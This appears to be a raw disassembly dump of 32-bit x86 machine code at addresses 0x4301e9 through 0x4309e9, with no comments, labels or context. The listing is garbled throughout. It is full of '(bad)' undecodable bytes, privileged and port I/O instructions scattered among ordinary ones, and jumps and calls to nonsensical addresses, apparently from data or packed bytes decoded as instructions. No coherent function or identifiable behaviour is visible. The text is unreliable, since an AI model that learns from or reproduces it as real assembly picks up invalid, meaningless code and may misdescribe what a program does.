  4301e9:	mov    DWORD PTR [eax],0x3ff44545
  4301ef:	xor    DWORD PTR [eax],eax
  4301f1:	test   DWORD PTR [ebx-0x34070b64],ecx
  4301f7:	(bad)  
  4301f8:	enter  0x4d45,0xb8
  4301fc:	mov    esi,DWORD PTR [edx]
  4301fe:	hlt    
  4301ff:	test   ebx,ecx
  430201:	pushf  
  430202:	enter  0x4df8,0x8b
  430206:	mov    DWORD PTR [ebp+0x8],0x894708
  43020d:	inc    ebp
  43020e:	mov    ebp,0xff8bfffc
  430213:	dec    ebp
  430214:	mov    ch,0xf4
  430216:	call   DWORD PTR [ebx-0x1]
  430219:	mov    ebx,0x8005426
  43021e:	call   DWORD PTR [ecx+0x8]
  430221:	pop    es
  430222:	jmp    0xb8:0x9cb4533
  430229:	fwait
  43022a:	mov    esi,DWORD PTR [edx-0xc]
  43022d:	xor    al,bl
  43022f:	add    BYTE PTR [ebx+0x3c83203],bl
  430235:	mov    DWORD PTR [ecx+0x45c4084d],ecx
  43023b:	mov    eax,DWORD PTR [ebx-0xb87b3]
  430241:	xor    eax,DWORD PTR [eax]
  430243:	retf   
  430244:	ret    
  430245:	add    eax,esi
  430247:	enter  0x8945,0x64
  43024b:	dec    ebp
  43024c:	sbb    ah,cl
  43024e:	add    BYTE PTR [ebx-0xb87b277],cl
  430254:	dec    DWORD PTR [ebx-0xbcfb275]
  43025a:	test   DWORD PTR [ebx],esi
  43025c:	dec    ebx
  43025e:	inc    DWORD PTR [ebx]
  430260:	inc    eax
  430261:	enter  0x8989,0x64
  430265:	(bad)  
  430266:	jmp    FWORD PTR [ebx+ecx*4-0x1]
  43026a:	cld    
  43026b:	dec    DWORD PTR [ebp-0xa90001]
  430271:	push   edi
  430272:	mov    BYTE PTR [edx+0x1],ch
  430275:	and    DWORD PTR [eax],eax
  430277:	pop    ecx
  430278:	inc    ebp
  430279:	mov    DWORD PTR [ebp-0xb28ff8],ecx
  43027f:	push   0xffffff89
  430281:	pop    ecx
  430282:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  430283:	dec    ebp
  430284:	add    BYTE PTR [ecx+0x45fc088b],cl
  43028a:	jne    0x4302d5
  43028c:	lea    eax,[eax]
  43028e:	fs (bad) 
  430290:	dec    DWORD PTR [eax]
  430292:	mov    DWORD PTR [eax],eax
  430294:	test   al,0x0
  430296:	add    BYTE PTR [ebp-0x18],cl
  430299:	xor    ebp,DWORD PTR [edx]
  43029b:	add    eax,DWORD PTR [eax]
  43029d:	mov    eax,eax
  43029f:	or     BYTE PTR [ebp+ecx*2+0x3003302],al
  4302a6:	inc    ebp
  4302a7:	mov    DWORD PTR [ebx+0x459408],ecx
  4302ad:	bound  ecx,QWORD PTR [ebx-0x372749b]
  4302b3:	inc    eax
  4302b4:	cmp    bh,0x1
  4302b7:	lea    eax,[eax]
  4302b9:	and    BYTE PTR [eax],al
  4302bb:	inc    DWORD PTR [ecx-0x18]
  4302be:	mov    ecx,DWORD PTR [ebx]
  4302c0:	cld    
  4302c1:	add    BYTE PTR [ecx+0x75014d],cl
  4302c7:	(bad)  
  4302c8:	xchg   ebp,eax
  4302c9:	sar    bh,1
  4302cb:	inc    eax
  4302cc:	inc    DWORD PTR [eax]
  4302ce:	mov    eax,DWORD PTR [ebp-0x4]
  4302d1:	xor    edx,DWORD PTR [edx+0x7201be]
  4302d7:	add    BYTE PTR [edx],dl
  4302d9:	(bad)  
  4302da:	nop
  4302db:	inc    ebp
  4302dc:	add    BYTE PTR [ebx-0x5afb0c00],cl
  4302e2:	mov    al,0xff
  4302e4:	add    bh,bh
  4302e6:	add    BYTE PTR [ebx],dh
  4302e8:	inc    DWORD PTR [ebx]
  4302ea:	sbb    al,0x89
  4302ec:	jne    0x4302ca
  4302ee:	mov    esp,DWORD PTR [ecx+0x4500fc]
  4302f4:	mov    eax,DWORD PTR [ebp-0xff0048]
  4302fa:	mov    DWORD PTR [eax-0x70],0xec70ed89
  430301:	inc    DWORD PTR [ebp-0x75]
  430304:	fisttp QWORD PTR [esi+ebp*8]
  430307:	test   DWORD PTR [esi-0x1],esp
  43030a:	inc    ebp
  43030b:	(bad)  
  43030c:	aas    
  43030d:	inc    ebp
  43030e:	(bad)  
  43030f:	lea    edi,[eax+edi*2-0x1]
  430313:	inc    edi
  430315:	mov    DWORD PTR ds:0x8000c7a0,edi
  43031b:	mov    ebp,esp
  43031d:	cld    
  43031e:	loop   0x4302ad
  430320:	inc    ebp
  430321:	(bad)  
  430322:	out    dx,al
  430323:	(bad)  
  430324:	fisttp WORD PTR [eax+0x8801c7]
  43032a:	jecxz  0x430371
  43032c:	in     al,dx
  43032d:	inc    DWORD PTR [ebp-0x4]
  430330:	out    0x8d,eax
  430332:	aas    
  430333:	(bad)  
  430334:	call   0xcb2e38
  430339:	add    DWORD PTR [ebx-0x7f490400],ecx
  43033f:	add    BYTE PTR [ecx],al
  430341:	test   DWORD PTR [eax],eax
  430343:	wrmsr  
  430345:	ja     0x430342
  430347:	add    BYTE PTR [eax],al
  430349:	mov    eax,DWORD PTR [ebp-0x747f8a04]
  43034f:	add    esp,edi
  430351:	add    BYTE PTR [eax+0x450108],al
  430357:	mov    edi,DWORD PTR [ebp-0x6c]
  43035a:	add    DWORD PTR [eax],0x4
  43035d:	mov    eax,DWORD PTR [ebp+0x3]
  430360:	mov    edi,DWORD PTR [esp+edi*8]
  430363:	dec    ebp
  430364:	nop
  430365:	mov    eax,DWORD PTR [ecx]
  430367:	fadd   DWORD PTR [eax]
  430369:	add    BYTE PTR [ecx*4-0xafa000],dl
  430370:	inc    ebp
  430371:	push   edx
  430372:	call   DWORD PTR [ebp-0x7b]
  430375:	mov    esi,DWORD PTR [ebp-0x74]
  430378:	mov    eax,DWORD PTR [eax]
  43037a:	cld    
  43037b:	mov    eax,DWORD PTR [eax+0x880103]
  430381:	add    BYTE PTR [ebp+0x6a],bh
  430384:	cmp    edi,0x10
  430387:	mov    WORD PTR [ebp+0x0],es
  43038a:	mov    edx,DWORD PTR [edx-0x4]
  43038d:	push   ecx
  43038e:	nop
  43038f:	inc    DWORD PTR [ecx]
  430391:	cld    
  430392:	add    BYTE PTR [ebp-0x16],bh
  430395:	mov    eax,DWORD PTR [eax]
  430397:	cld    
  430398:	push   eax
  430399:	nop
  43039a:	inc    ebp
  43039b:	add    edi,edi
  43039d:	add    BYTE PTR [ebx+0x4de2f445],cl
  4303a3:	jmp    0xe33b:0x9403c733
  4303aa:	movntq QWORD PTR [edx],mm7
  4303ad:	mov    DWORD PTR [eax],0xb87e8b98
  4303b3:	test   ebx,eax
  4303b5:	jmp    DWORD PTR [ebp-0x1]
  4303b8:	int    0xed
  4303ba:	sub    esp,esi
  4303bc:	add    eax,DWORD PTR [ebp-0x30]
  4303bf:	fild   WORD PTR [ebp+0x3f]
  4303c2:	cmp    eax,edi
  4303c4:	je     0xc043e9ea
  4303ca:	mov    DWORD PTR [ebp-0x28],0xdb00eb
  4303d1:	(bad)  
  4303d2:	jne    0x430360
  4303d4:	mov    ebx,ebp
  4303d6:	cld    
  4303d7:	jle    0x43041e
  4303d9:	dec    ecx
  4303da:	mov    eax,DWORD PTR [eax]
  4303dc:	mov    ah,0x50
  4303de:	add    BYTE PTR [ebp-0x18],al
  4303e1:	mov    ebp,DWORD PTR [ecx]
  4303e3:	test   al,0x0
  4303e5:	add    BYTE PTR [ebx-0x7f170301],cl
  4303eb:	add    DWORD PTR es:[eax],eax
  4303ee:	add    al,al
  4303f0:	xor    BYTE PTR [eax+0x4f],dl
  4303f3:	inc    ebp
  4303f4:	add    BYTE PTR [ebx+0xfcd88b],cl
  4303fa:	mov    DWORD PTR [ebx-0x3fff03ff],ecx
  430400:	add    DWORD PTR [ecx+0x458be845],ecx
  430406:	fmul   DWORD PTR [ebx+0x8bb800]
  43040c:	cld    
  43040d:	call   0xd82ed2
  430412:	dec    DWORD PTR [ebx+0x109ee8ff]
  430418:	add    al,al
  43041a:	push   eax
  43041b:	es inc ebp
  43041d:	inc    ebp
  43041e:	mov    ecx,DWORD PTR [ebx+0xd89c]
  430424:	dec    DWORD PTR [ebx-0x3ff70301]
  43042a:	mov    DWORD PTR gs:[eax],eax
  43042d:	call   0x8c134967
  430432:	sar    BYTE PTR [eax-0x17baffd8],0x8b
  430439:	sub    eax,ebx
  43043b:	add    BYTE PTR [eax],al
  43043d:	mov    ecx,DWORD PTR [ebx-0x3fef0318]
  430443:	inc    ebp
  430444:	push   ebp
  430445:	mov    ebp,eax
  430447:	shr    BYTE PTR [ecx],1
  430449:	ret    
  43044a:	add    dh,al
  43044c:	mov    eax,ecx
  43044e:	cld    
  43044f:	test   BYTE PTR [eax+0x101],al
  430455:	inc    ebp
  430456:	xor    BYTE PTR [ebx],dh
  430458:	push   edi
  430459:	mov    ecx,0xffe48d89
  43045e:	inc    ebp
  43045f:	enter  0x4d8b,0xfc
  430463:	mov    eax,ebx
  430465:	or     BYTE PTR [ebx+0x38732c1],bl
  43046b:	add    DWORD PTR [ebp-0xbac000],ecx
  430471:	add    al,ch
  430473:	add    BYTE PTR [ecx],ch
  430475:	inc    DWORD PTR [eax]
  430477:	cld    
  430478:	mov    edi,DWORD PTR [ebp-0xc]
  43047b:	mov    esi,DWORD PTR [ebp-0x4]
  43047e:	xor    edx,DWORD PTR [eax+0x8d0103]
  430484:	and    BYTE PTR [ebp+0x50e800ff],bl
  43048a:	sub    DWORD PTR [ebp+0x0],eax
  43048d:	mov    edi,edi
  43048f:	test   al,0xe4
  430491:	add    BYTE PTR [ebp-0x1],cl
  430494:	xor    ebp,eax
  430496:	add    esp,DWORD PTR [esi]
  430498:	cmp    eax,DWORD PTR [eax]
  43049a:	jne    0x4304e9
  43049c:	(bad)  
  43049d:	mov    ebx,eax
  43049f:	pushf  
  4304a0:	add    BYTE PTR [eax],al
  4304a2:	add    BYTE PTR [ecx-0x37474bb],cl
  4304a8:	or     BYTE PTR [eax+0x8401c3],bh
  4304ae:	fwait
  4304af:	jne    0x4304e3
  4304b1:	xor    ecx,DWORD PTR [ecx+0x457c088d]
  4304b7:	inc    DWORD PTR [ebp-0x74d68b18]
  4304bd:	add    BYTE PTR [eax+0x33fc4d8b],bh
  4304c3:	or     BYTE PTR [ebp+0x72000801],0x30
  4304ca:	add    BYTE PTR [edi+0x45],dl
  4304cd:	or     DWORD PTR [ebx-0x3c95471c],0xffffffff
  4304d4:	gs test ebp,ecx
  4304d7:	je     0x430504
  4304d9:	mov    eax,DWORD PTR [ebx]
  4304db:	cld    
  4304dc:	sar    BYTE PTR [eax+0x3b0145],1
  4304e2:	pcmpeqw mm4,mm2
  4304e5:	xor    edi,edi
  4304e7:	lea    ecx,[ebx-0x23927470]
  4304ed:	add    BYTE PTR [ebp+0x50],cl
  4304f0:	cmp    eax,DWORD PTR [ebp+0x75]
  4304f3:	mov    ebp,DWORD PTR [eax-0x68]
  4304f6:	test   DWORD PTR [eax],eax
  4304f8:	clc    
  4304f9:	push   DWORD PTR [ebp-0x1]
  4304fc:	lea    ecx,[eax]
  4304fe:	int3   
  4304ff:	inc    ebp
  430500:	call   0xfb3690
  430505:	jne    0x4304ff
  430507:	xor    edi,DWORD PTR [ebp-0x41]
  43050a:	jmp    0x43057e
  43050c:	mov    eax,DWORD PTR [eax]
  43050e:	mov    eax,0x339545c7
  430513:	inc    DWORD PTR [ebx]
  430515:	push   DWORD PTR [ecx]
  430517:	inc    ecx
  430518:	mov    eax,DWORD PTR [eax]
  43051a:	jmp    0x43056c
  43051c:	mov    eax,DWORD PTR [ebp-0x3c]
  43051f:	mov    eax,eax
  430521:	cld    
  430522:	clc    
  430523:	ret    
  430524:	test   bh,al
  430526:	pop    es
  430527:	xchg   ebp,eax
  430528:	add    bh,bh
  43052a:	inc    ebp
  43052b:	dec    DWORD PTR [edi]
  43052d:	sub    ebp,DWORD PTR [ebx]
  43052f:	add    BYTE PTR [eax],al
  430531:	push   eax
  430532:	jbe    0x430589
  430534:	mov    cl,BYTE PTR [ebx-0x34e00b80]
  43053a:	or     al,0xcf
  43053c:	inc    eax
  43053d:	enter  0x745,0x72
  430541:	inc    ebp
  430542:	mov    eax,DWORD PTR [ecx]
  430544:	int3   
  430545:	add    BYTE PTR [ebp-0x75],al
  430548:	xor    DWORD PTR [eax+0x33c74d9c],edi
  43054e:	ror    BYTE PTR [ebp+0x72f80885],1
  430554:	inc    ebp
  430555:	add    BYTE PTR [ebx-0x3c7423bb],cl
  43055b:	fadd   st,st(6)
  43055d:	rol    BYTE PTR [ebp+0x12],0x8b
  430561:	inc    ebp
  430562:	fmul   QWORD PTR [ebx-0x3c39233d]
  430568:	inc    ebp
  430569:	test   bh,al
  43056b:	fwait
  43056c:	clc    
  43056d:	xor    al,BYTE PTR [ebp+0x45dcf889]
  430573:	inc    ebp
  430574:	xor    esi,DWORD PTR [ebx]
  430576:	pushf  
  430577:	mov    ecx,0xffb48dc7
  43057c:	test   eax,ecx
  43057e:	clc    
  43057f:	dec    ebp
  430580:	inc    ebp
  430581:	mov    edi,DWORD PTR ds:0xc7c19c08
  430587:	xchg   BYTE PTR [esi+edi*8-0x807007b],ah
  43058e:	inc    ebp
  43058f:	inc    ebp
  430590:	aas    
  430591:	mov    ebx,DWORD PTR [eax+ecx*1+0x18e8c8c7]
  430598:	test   DWORD PTR [ecx],esi
  43059a:	clc    
  43059b:	pushf  
  43059c:	inc    ebp
  43059d:	dec    DWORD PTR [ebx-0x3cba0f04]
  4305a3:	push   eax
  4305a4:	mov    BYTE PTR [edx],0x7d
  4305a7:	add    BYTE PTR [ebx],bh
  4305a9:	mov    ecx,DWORD PTR [edi]
  4305ab:	mov    DWORD PTR [eax],ebx
  4305ad:	les    eax,FWORD PTR [eax]
  4305af:	adc    ebp,ecx
  4305b1:	dec    ebp
  4305b2:	add    DWORD PTR [ebx-0x34ba3c00],ecx
  4305b8:	mov    ecx,esi
  4305ba:	lock or al,cl
  4305bd:	clc    
  4305be:	inc    ebp
  4305bf:	add    esi,DWORD PTR [ebx]
  4305c1:	jge    0x4305c6
  4305c3:	xor    edi,DWORD PTR [ebx]
  4305c5:	cmp    ecx,DWORD PTR [edi]
  4305c7:	paddb  mm1,QWORD PTR [eax+eax*1+0x0]
  4305cc:	mov    edi,DWORD PTR [ecx]
  4305ce:	test   al,0xcc
  4305d0:	dec    ebp
  4305d1:	test   BYTE PTR [ebx],dh
  4305d3:	pop    es
  4305d4:	xor    eax,DWORD PTR [eax]
  4305d6:	add    ecx,DWORD PTR [esi]
  4305d8:	add    ecx,eax
  4305da:	psraw  mm0,mm1
  4305dd:	sub    BYTE PTR [ebp+0x38],cl
  4305e0:	mov    edi,DWORD PTR [ebx]
  4305e2:	lock int3 
  4305e4:	shl    edx,1
  4305e6:	rol    BYTE PTR [ebp+0xc],1
  4305e9:	mov    DWORD PTR [ebp-0x24],0xf8038533
  4305f0:	jmp    0x75063a
  4305f5:	pushf  
  4305f6:	inc    ebp
  4305f7:	mov    DWORD PTR [ebx-0x3cba0710],ecx
  4305fd:	xor    ecx,ebx
  4305ff:	add    ecx,esi
  430601:	mov    esi,eax
  430603:	enter  0x45af,0x8b
  430607:	xor    ecx,eax
  430609:	add    edx,DWORD PTR [ebp-0x77]
  43060c:	sub    ecx,DWORD PTR [eax]
  43060e:	cmp    eax,DWORD PTR [ebp+0x77]
  430611:	ror    DWORD PTR [ebx-0x76385764],1
  430617:	test   al,0x0
  430619:	test   DWORD PTR [ebx+0x4d45acf8],ecx
  43061f:	cmp    al,0x33
  430621:	pushf  
  430622:	xor    eax,edi
  430624:	add    ebp,DWORD PTR [ebx+eax*1-0x3e07f07b]
  43062b:	inc    ebp
  43062c:	dec    ebp
  43062d:	mov    ebx,DWORD PTR ds:[eax+esi*8-0x2f432e39]
  430635:	test   DWORD PTR ds:0xeb4545f8,eax
  43063b:	cmp    BYTE PTR [ebx+0x4d8ba49c],cl
  430641:	fdiv   QWORD PTR [ebx]
  430643:	dec    ebp
  430644:	xor    esi,DWORD PTR [ebx]
  430646:	add    eax,DWORD PTR [ebx]
  430648:	add    ecx,DWORD PTR [ecx-0x373e4ff1]
  43064e:	dec    ebp
  43064f:	test   BYTE PTR [ebx-0x2eff0ffe],cl
  430655:	out    dx,eax
  430656:	rol    BYTE PTR [eax],1
  430658:	add    eax,0xebc8458b
  43065d:	dec    ebp
  43065e:	mov    ebp,DWORD PTR [ebx]
  430660:	mov    esp,0x33f84d8b
  430665:	ret    
  430666:	xor    eax,esi
  430668:	add    ecx,eax
  43066a:	add    eax,DWORD PTR [edx+0xc1010f]
  430670:	dec    ebp
  430671:	inc    ebp
  430672:	mov    ecx,DWORD PTR [ebx-0x3c2e0710]
  430678:	ror    bl,1
  43067a:	add    eax,0xebc645ce
  43067f:	scas   eax,DWORD PTR es:[edi]
  430680:	mov    ecx,DWORD PTR [ebx+0x554dc8e8]
  430686:	xor    ebp,DWORD PTR [ebx]
  430688:	xor    edi,DWORD PTR [ebx]
  43068a:	add    esi,DWORD PTR [edi+0x3]
  43068d:	mov    ecx,DWORD PTR [edi]
  43068f:	clc    
  430690:	rol    ebx,0x4d
  430693:	(bad)  
  430694:	mov    edi,DWORD PTR [eax+esi*8-0x2f742f00]
  43069b:	mov    ah,0x45
  43069d:	dec    ebp
  43069e:	jbe    0x4306d3
  4306a0:	mov    esi,DWORD PTR [ebx]
  4306a2:	call   0x334653aa
  4306a7:	rdpmc  
  4306a9:	rol    DWORD PTR [ebx],0x4d
  4306ac:	add    ecx,DWORD PTR [ebx-0x2e3e0ff1]
  4306b2:	inc    ebp
  4306b3:	ror    BYTE PTR [ebx+0x45450808],1
  4306b9:	jmp    0x10b0749
  4306be:	inc    ebp
  4306bf:	inc    ebp
  4306c0:	(bad)  
  4306c1:	mov    ebx,eax
  4306c3:	clc    
  4306c4:	test   ebx,eax
  4306c6:	clc    
  4306c7:	retf   
  4306c8:	inc    ebp
  4306c9:	into   
  4306ca:	mov    esi,0x8b85afec
  4306d0:	clc    
  4306d1:	enter  0x5545,0x33
  4306d5:	sub    ebx,DWORD PTR [ebx+edi*1-0x74278875]
  4306dc:	ret    
  4306dd:	mov    ah,0xc6
  4306df:	addr16 push 0x338b4545
  4306e5:	clc    
  4306e6:	add    eax,ebx
  4306e8:	loopne 0x4306b5
  4306ea:	dec    ebp
  4306eb:	into   
  4306ec:	mov    al,dh
  4306ee:	or     BYTE PTR [edi-0x37ff748e],ch
  4306f4:	inc    ebp
  4306f5:	push   ebp
  4306f6:	mov    ebp,DWORD PTR [ebx]
  4306f8:	in     al,dx
  4306f9:	cmp    eax,ebx
  4306fb:	ja     0x430742
  4306fd:	mov    ecx,DWORD PTR [ebx-0x7bba2354]
  430703:	inc    ebp
  430704:	fwait
  430705:	mov    esi,DWORD PTR [edx]
  430707:	clc    
  430708:	mov    bl,al
  43070a:	xlat   BYTE PTR ds:[ebx]
  43070b:	retf   
  43070c:	inc    ebp
  43070d:	into   
  43070e:	mov    eax,esi
  430710:	in     al,dx
  430711:	scas   eax,DWORD PTR es:[edi]
  430712:	retf   
  430713:	mov    ecx,DWORD PTR [ebp-0x38]
  430716:	mov    edx,DWORD PTR [ebp-0x24]
  430719:	sub    eax,DWORD PTR [ebx+edi*1-0x74cd8865]
  430720:	mov    ah,BYTE PTR [edi+edx*8+0x33454d23]
  430727:	mov    eax,DWORD PTR [ebx]
  430729:	clc    
  43072a:	loopne 0x4306ef
  43072c:	push   ebp
  43072d:	retf   
  43072e:	mov    dh,al
  430730:	adc    esi,ecx
  430732:	jb     0x4306e3
  430734:	add    BYTE PTR [ebx+0x558bc845],cl
  43073a:	in     al,dx
  43073b:	sub    eax,ebx
  43073d:	cmp    ecx,ebx
  43073f:	mov    eax,esi
  430741:	mov    esp,0x45af03ce
  430746:	add    ecx,DWORD PTR [ebx-0x34ba0720]
  43074c:	mov    eax,ebx
  43074e:	in     al,dx
  43074f:	into   
  430750:	dec    ebp
  430751:	(bad)  
  430752:	xor    ebp,DWORD PTR [edi+0x80f8903]
  430758:	rol    DWORD PTR [ebp+0x4d],0x89
  43075c:	xor    esp,esp
  43075e:	sub    eax,DWORD PTR [ebp-0x75]
  430761:	add    ebp,esp
  430763:	mov    al,0x55
  430765:	inc    ebp
  430766:	xor    esi,DWORD PTR [ecx]
  430768:	add    ebx,DWORD PTR [edi+ecx*1+0x55dcca89]
  43076f:	inc    ebp
  430770:	xor    esi,DWORD PTR [edx]
  430772:	sub    ebx,DWORD PTR [ebp+ecx*4+0x72c011c7]
  430779:	test   DWORD PTR [eax],eax
  43077b:	clc    
  43077c:	enter  0x8645,0x33
  430780:	inc    DWORD PTR [ebx]
  430782:	(bad)  
  430783:	jmp    0x4307ca
  430785:	mov    ecx,DWORD PTR [ebx-0x3c3c1b28]
  43078b:	inc    ebp
  43078c:	(bad)  
  43078d:	mov    ebp,DWORD PTR [edi-0x277b7424]
  430793:	fwait
  430794:	retf   
  430795:	xor    al,cl
  430797:	mov    BYTE PTR [ebp+0xb],cl
  43079a:	lea    eax,[ebp+0x8]
  43079d:	xor    esi,DWORD PTR [edx+0x3]
  4307a0:	add    al,ah
  4307a2:	inc    ebp
  4307a3:	dec    ebp
  4307a4:	mov    ecx,DWORD PTR [edx+0x72c308d0]
  4307aa:	gs add ch,cl
  4307ad:	inc    ebp
  4307ae:	sub    ecx,DWORD PTR [edx+0x4df00b03]
  4307b4:	inc    ebp
  4307b5:	xor    ecx,DWORD PTR [ebx-0x3c1f37fd]
  4307bb:	push   ebp
  4307bc:	(bad)  
  4307bd:	mov    BYTE PTR [edi+0xf723b11],ch
  4307c3:	add    ch,ch
  4307c5:	inc    ebp
  4307c6:	dec    DWORD PTR [ebx-0x34332775]
  4307cc:	add    al,0x4d
  4307ce:	inc    ebp
  4307cf:	mov    ecx,DWORD PTR [ebx-0x7f7b0324]
  4307d5:	fwait
  4307d6:	add    DWORD PTR [edx],esi
  4307d8:	add    BYTE PTR [ebx+0x4d00c000],cl
  4307de:	push   DWORD PTR [ebx]
  4307e0:	int3   
  4307e1:	xor    eax,DWORD PTR [eax]
  4307e3:	add    edx,DWORD PTR [eax+0x3]
  4307e6:	mov    DWORD PTR [edi],ecx
  4307e8:	call   0x4288c8ae
  4307ed:	mov    DWORD PTR [ebp-0x20],esp
  4307f0:	add    BYTE PTR [ebp+0x7d],al
  4307f3:	mov    eax,DWORD PTR [eax]
  4307f5:	in     al,0x15
  4307f7:	ret    
  4307f8:	iret   
  4307f9:	(bad)  
  4307fa:	enter  0x14af,0x8b
  4307fe:	(bad)  
  4307ff:	in     al,dx
  430800:	or     bl,cl
  430802:	adc    cl,al
  430804:	push   ebp
  430805:	dec    ebp
  430806:	inc    eax
  430807:	mov    edx,DWORD PTR [ebp-0x20]
  43080a:	jb     0x4307d7
  43080c:	mov    ecx,esi
  43080e:	cld    
  43080f:	scas   eax,DWORD PTR es:[edi]
  430810:	or     BYTE PTR [ebx-0x2cff27ff],0x0
  430817:	mov    BYTE PTR [eax],0x8c
  43081a:	push   0xffffff9b
  43081c:	push   edi
  43081d:	xor    dl,BYTE PTR [eax+0x3b]
  430820:	mov    ecx,DWORD PTR [edi]
  430822:	call   0x8c424d85
  430827:	mov    eax,eax
  430829:	in     al,dx
  43082a:	jge    0x430879
  43082c:	mov    DWORD PTR [ebx],esi
  43082e:	int3   
  43082f:	add    eax,DWORD PTR [ebp+0xf]
  430832:	xor    eax,ecx
  430834:	(bad)  
  430835:	dec    ebp
  430836:	pushf  
  430837:	xor    ecx,esi
  430839:	add    edi,DWORD PTR [edi]
  43083b:	mov    eax,DWORD PTR [ebp-0x38]
  43083e:	(bad)  
  43083f:	test   dh,dl
  430841:	fwait
  430842:	add    esi,DWORD PTR [edx]
  430844:	jmp    0x4307cf
  430846:	mov    cl,al
  430848:	add    eax,0x14330f45
  43084d:	mov    ecx,0xff468d80
  430852:	jmp    0xc990181f
  430857:	mov    edx,ecx
  430859:	rol    BYTE PTR [ebp+0x330155],1
  43085f:	add    ecx,DWORD PTR [ebp+0xf]
  430862:	xor    eax,edx
  430864:	(bad)  
  430865:	ror    DWORD PTR [eax],0x86
  430868:	jb     0x430867
  43086a:	add    bh,bh
  43086c:	clc    
  43086d:	inc    ebp
  43086e:	jb     0x4308da
  430870:	mov    ecx,DWORD PTR [ecx+0x4545c008]
  430876:	xor    DWORD PTR [ebx+0xc7d89c],ecx
  43087c:	shr    BYTE PTR [eax-0x3d],0x30
  430880:	clc    
  430881:	add    BYTE PTR [ebp+0x75],al
  430884:	xor    DWORD PTR [edx-0x64],ebp
  430887:	inc    edi
  430889:	adc    al,0xe8
  43088b:	inc    ebp
  43088c:	test   DWORD PTR [ebp-0x7cba8b08],eax
  430892:	mov    ecx,DWORD PTR [eax]
  430894:	cld    
  430895:	or     DWORD PTR [ebp-0x34],0x33
  430899:	jbe    0x43089e
  43089b:	mov    edx,DWORD PTR [ecx+0x2b]
  43089e:	dec    ebp
  43089f:	mov    cl,BYTE PTR [ebx+0x45d801]
  4308a5:	mov    BYTE PTR [ebx],dh
  4308a7:	mov    eax,DWORD PTR [ebx]
  4308a9:	or     BYTE PTR [ecx+0x3b],dl
  4308ac:	dec    ebp
  4308ad:	int3   
  4308ae:	xor    ebp,edi
  4308b0:	add    eax,DWORD PTR [ebp+0x51]
  4308b3:	mov    ecx,DWORD PTR [ebp-0x28]
  4308b6:	xor    eax,DWORD PTR [eax]
  4308b8:	add    ebp,DWORD PTR [eax+0x51]
  4308bb:	adc    BYTE PTR [eax+0x0],0x8b
  4308bf:	add    BYTE PTR [ebx+0x4d18fcff],cl
  4308c5:	inc    ebp
  4308c6:	mov    ecx,DWORD PTR [ecx+0x4500c4d8]
  4308cc:	xor    ecx,DWORD PTR [ebx+0x4551c403]
  4308d2:	dec    ebp
  4308d3:	mov    esi,DWORD PTR [ebx]
  4308d5:	hlt    
  4308d6:	add    eax,ebx
  4308d8:	push   ecx
  4308d9:	inc    ebp
  4308da:	dec    ebp
  4308db:	(bad)  
  4308dc:	call   esi
  4308de:	in     al,0xc7
  4308e0:	retf   
  4308e1:	mov    al,ds:0xc5ff3dce
  4308e6:	adc    al,0xc6
  4308e8:	inc    ebp
  4308e9:	and    eax,0x9c0f4c85
  4308ee:	cmp    DWORD PTR [esi-0xe7ac800],0xf
  4308f5:	cmp    BYTE PTR [ebx+0x38],0x0
  4308f9:	mov    dh,0xc7
  4308fb:	cmp    eax,eax
  4308fd:	jne    0x45440149
  430903:	mov    esi,DWORD PTR [ebx]
  430905:	mov    eax,0x848bcb9c
  43090a:	rcr    BYTE PTR [ebx-0x7c7fcd0f],0x65
  430911:	or     BYTE PTR [edi],cl
  430913:	(bad)  
  430914:	dec    ebp
  430915:	inc    edi
  430916:	add    bh,0x54
  430919:	or     cl,ch
  43091b:	test   DWORD PTR [eax+0x4d4501f8],ecx
  430921:	add    BYTE PTR [eax-0x1638ab64],0xbc
  430928:	mov    BYTE PTR [ebp+0x45a5f802],dh
  43092e:	(bad)  
  43092f:	cmp    eax,0x89839cff
  430934:	je     0x43091a
  430936:	inc    DWORD PTR [ebp+0x0]
  430939:	mov    ecx,DWORD PTR [ebp-0x340018]
  43093f:	into   
  430940:	dec    DWORD PTR [ebx-0x7f72431c]
  430946:	push   0x5000ff01
  43094b:	retf   
  43094c:	inc    ebp
  43094d:	into   
  43094e:	dec    DWORD PTR [ebx-0x343f3ff4]
  430954:	push   eax
  430955:	into   
  430956:	call   0x4b0de6
  43095b:	retf   
  43095c:	add    dh,cl
  43095e:	add    bh,bh
  430960:	mov    DWORD PTR [eax+ecx*1],edx
  430963:	clc    
  430964:	inc    ebp
  430965:	inc    ebp
  430966:	mov    ecx,DWORD PTR [ebx-0x7fff1728]
  43096c:	push   0x1
  43096e:	push   edi
  43096f:	add    BYTE PTR [eax-0x35],dl
  430972:	mov    ecx,esi
  430974:	cld    
  430975:	mov    ecx,DWORD PTR [ecx+0xcb01bc]
  43097b:	into   
  43097c:	ror    BYTE PTR [ebx+0x75000800],0x50
  430983:	xor    eax,DWORD PTR [ebp+0x3]
  430986:	jne    0x4309d9
  430988:	call   DWORD PTR [eax-0x3c]
  43098b:	mov    DWORD PTR [ecx-0x18],edx
  43098e:	mov    edi,edi
  430990:	call   0x8b464f19
  430995:	add    ah,ah
  430997:	rol    BYTE PTR [ebp-0x7c],0xeb
  43099b:	add    edi,edi
  43099d:	add    al,ch
  43099f:	inc    ebp
  4309a0:	push   ecx
  4309a1:	cmp    al,0x8b
  4309a3:	pushf  
  4309a4:	(bad)  
  4309a5:	mov    DWORD PTR [ebp-0x50],0xf8e485c7
  4309ac:	test   DWORD PTR [ebp-0x8],ecx
  4309af:	add    BYTE PTR [ebp+0x54],0x32
  4309b3:	jmp    0x8bcc9254
  4309b8:	in     al,dx
  4309b9:	or     BYTE PTR [ebp-0xf],al
  4309bc:	xor    eax,DWORD PTR [eax+0x4f896503]
  4309c2:	hlt    
  4309c3:	mov    eax,DWORD PTR [ebp-0x50]
  4309c6:	xor    esi,ecx
  4309c8:	add    eax,DWORD PTR [eax+0x4f086589]
  4309ce:	inc    ebp
  4309cf:	adc    ecx,0x68
  4309d2:	pushf  
  4309d3:	inc    edi
  4309d5:	add    al,ch
  4309d7:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4309d8:	test   edi,edi
  4309da:	clc    
  4309db:	inc    DWORD PTR [ebp-0x73]
  4309de:	cmp    al,0x74
  4309e0:	pushf  
  4309e1:	inc    edi
  4309e3:	push   ecx
  4309e4:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4309e5:	jne    0x43096c
  4309e7:	push   eax
  4309e8:	clc    
  4309e9:	test   DWORD PTR [ebp-0x1],eax
